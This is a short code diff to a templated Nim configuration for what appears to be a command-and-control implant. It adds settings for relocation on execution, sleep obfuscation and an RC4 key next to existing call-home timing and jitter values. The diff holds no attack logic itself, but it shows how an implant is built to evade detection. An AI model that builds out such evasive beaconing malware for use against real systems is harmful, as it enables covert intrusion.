@@ -19,8 +19,12 @@ let is_exe* = IS_EXE
 let sleep_on_execution* = {config["agent"]["sleep_on_execution"]}
 let agent_execution_path_windows* = protectString("{config["agent"]["exe"]["execution_path"]}")
 let agent_execution_path_linux* = protectString("{config["agent"]["elf"]["execution_path"]}")
+let reloc_on_exec_windows* = {str(config["agent"]["exe"]["reloc_on_exec"]).lower()}
+let reloc_on_exec_linux* = {str(config["agent"]["elf"]["reloc_on_exec"]).lower()}
 var call_home_timeframe* = {config["agent"]["call_home_timeframe"]}
 var call_home_jitter_percent* = {config["agent"]["call_home_jitter_percent"]}
+var memsleep_technique* = {config["agent"]["sleep_obfuscation_technique"]}
+var nekko_rc4_key* = protectString("{config["agent"]["nekko_rc4_key"]}")
 # Communication
 let communication_aes_key* = protectString("{config["communication"]["aes_key"]}")
 let communication_aes_iv* = protectString("{config["communication"]["aes_iv"]}")
